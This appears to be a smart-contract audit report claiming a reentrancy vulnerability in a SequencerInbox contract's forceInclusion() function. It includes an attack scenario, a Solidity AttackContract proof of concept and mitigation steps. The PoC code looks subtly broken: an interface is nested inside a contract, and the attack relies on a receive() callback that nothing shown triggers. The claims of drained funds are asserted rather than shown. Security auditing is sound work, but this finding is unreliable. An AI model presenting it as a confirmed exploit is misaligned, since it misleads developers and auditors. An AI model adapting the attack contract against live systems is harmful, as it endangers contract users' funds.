# Vulnerability details

## Impact
The 'forceInclusion()' function is responsible for forcing the inclusion of delayed messages into the sequencer. It calculates certain parameters and then calls the 'addSequencerL2BatchImpl()' function to add the batch to the sequencer.

The vulnerability occurs because the addSequencerL2BatchImpl() function is called within the forceInclusion() function before the state changes are finalized. This means that an attacker could potentially call forceInclusion() recursively before the first call completes, leading to reentrancy.
#### Attack Scenario:

- The attacker first deploys a malicious contract that contains a function to repeatedly call the forceInclusion() function of the vulnerable SequencerInbox contract.
- The attacker's contract recursively calls the forceInclusion() function, potentially causing unexpected behavior such as reordering of messages, incorrect message processing, or loss of funds.
- By exploiting this vulnerability, the attacker may be able to drain funds from the contract or disrupt its normal operation.


## Proof of Concept
In this proof of concept:

- We create an AttackContract with a function triggerAttack() that calls the vulnerable forceInclusion() function of the target contract.
- When triggerAttack() is called, it initiates the reentrancy attack by calling forceInclusion() with malicious parameters.
- The receive() function is also defined to enable reentrancy by receiving ETH and calling forceInclusion() again.
```
pragma solidity ^0.8.0;

contract AttackContract {
    // Define the target contract interface
    interface TargetContract {
        function forceInclusion(
            uint256 _totalDelayedMessagesRead,
            uint8 kind,
            uint64[2] calldata l1BlockAndTime,
            uint256 baseFeeL1,
            address sender,
            bytes32 messageDataHash
        ) external;
    }

    // Define the target contract address
    TargetContract public targetContract;

    // Define the constructor to set the target contract address
    constructor(address _targetContract) {
        targetContract = TargetContract(_targetContract);
    }

    // Function to trigger the reentrancy attack
    function triggerAttack() external {
        // Call the target contract's function with malicious parameters
        // This function will revert after performing the first reentrancy
        targetContract.forceInclusion(
            0,  // Set a lower value than totalDelayedMessagesRead to trigger the reentrancy
            0,  // Set any value for the kind parameter
            [0, 0],  // Set any values for the l1BlockAndTime parameter
            0,  // Set any value for the baseFeeL1 parameter
            address(this),  // Set the attacker's address as the sender
            bytes32(0)  // Set any value for the messageDataHash parameter
        );
    }

    // Function to receive ETH
    receive() external payable {
        // Trigger reentrancy again
        targetContract.forceInclusion(
            0,  // Set a lower value than totalDelayedMessagesRead to trigger the reentrancy
            0,  // Set any value for the kind parameter
            [0, 0],  // Set any values for the l1BlockAndTime parameter
            0,  // Set any value for the baseFeeL1 parameter
            address(this),  // Set the attacker's address as the sender
            bytes32(0)  // Set any value for the messageDataHash parameter
        );
    }
}
```

## Recommended Mitigation Steps
1. Implement a reentrancy guard: Add a boolean flag to track whether the function is currently being executed and modify the function to only proceed if the flag is not set. After the function execution completes, reset the flag.

2. Ensure that state changes are performed before external calls: If any external calls are made within the function, ensure that state changes are performed before the external call to prevent reentrancy attacks from manipulating the contract state during execution.
